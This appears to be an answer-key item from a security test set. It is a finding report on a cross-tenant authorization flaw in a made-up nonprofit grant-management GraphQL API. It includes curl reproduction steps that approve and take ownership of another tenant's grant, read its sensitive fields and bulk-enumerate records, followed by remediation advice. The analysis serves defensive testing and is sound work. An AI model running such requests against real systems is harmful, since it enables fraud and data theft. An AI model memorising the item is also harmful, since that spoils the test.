# Expected Response

## System
- System: GrantFlow CRM API v1.5.8
- Domain: NON-PROFIT / GRANT MANAGEMENT
- Example ID: GQL-0427
- Risk ID: RISK-GQL-427

## Findings

### 1. Pattern 1.10 — Cross-Service Identity Propagation Drift via `updateResource` (HAR Primary)

The `updateResource` mutation accepts a cross-tenant `id` with an `input` including `ownerId`. Pattern 1.10 "cross-service identity propagation drift" — the attacker's identity drifts into the target cross-tenant record via the update: they can approve another nonprofit's grant application AND overwrite its `ownerId` with their own, effectively claiming ownership of a different organization's grant.

HAR shows `updateResource(id: "R-2427", input: {status: "approved", ownerId: "attacker-8a02fbd5"})` from `tenant-8a02`. The response returns `getResource` data for `tenant-fbd5` — synthetic artifact; the authoritative evidence is the mutation operating on a cross-tenant ID and propagating the attacker's `ownerId` into the record.

In Non-Profit / Grant Management: approving another organization's grant application or taking ownership of their approved grant is a financial fraud and fiduciary violation.

**Evidence from HAR:**
- Request: `updateResource(id: "R-2427", input: {status: "approved", ownerId: "attacker-8a02fbd5"})` from `tenant-8a02`
- `ownerId` in input: `"attacker-8a02fbd5"` — attacker's identity propagated into cross-tenant record
- Response `tenantId: "tenant-fbd5"` — cross-tenant grant record mutated
- HTTP status: 200 — identity drift succeeded

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s -X POST https://api.grantflow-crm-api.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8A02>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-8a02" \
  -d '{"query": "query { getResource(id: \"R-1427\") { resourceId tenantId ownerId data { sensitiveField } } }"}'
```
**Expected:** Returns `tenantId: "tenant-8a02"`.

**Step 2 — Cross-tenant grant approval + identity propagation (primary HAR attack):**
```bash
curl -s -X POST https://api.grantflow-crm-api.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8A02>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-8a02" \
  -d '{"query": "mutation { updateResource(id: \"R-2427\", input: {status: \"approved\", ownerId: \"attacker-8a02fbd5\"}) { resourceId tenantId ownerId status } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-fbd5"` — another nonprofit's grant application approved; attacker's `ownerId` propagated into the cross-tenant record.

**Step 3 — Cross-tenant grant read post-update:**
```bash
curl -s -X POST https://api.grantflow-crm-api.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8A02>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-8a02" \
  -d '{"query": "query { getResource(id: \"R-2427\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns cross-tenant grant data — reading `sensitiveField` after taking ownership (RISK-GQL-427).

**Step 4 — Bulk cross-tenant grant enumeration:**
```bash
curl -s -X POST https://api.grantflow-crm-api.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-8A02>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-8a02" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2427\", \"R-3427\", \"R-4427\"]) { resourceId tenantId ownerId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns grant data from multiple nonprofits.

### 2. Redis Cache Grant Data Leak

Cache key is `resourceId` only. After the attacker updates `R-2427`, the cached version may serve the tampered grant record (with attacker `ownerId`) to legitimate queries from `tenant-fbd5`.

## Secure Outcome
```json
{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": null }
```

## Remediation
- Resolver-level tenant check: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` (RISK-GQL-427).
- Strip `ownerId` from `updateResource` input — server must set `ownerId` from JWT `sub`, never from client input.
- Per-ID ownership filter in `bulkResourceLookup`.
- Fix Redis cache key: include `tenantId`.
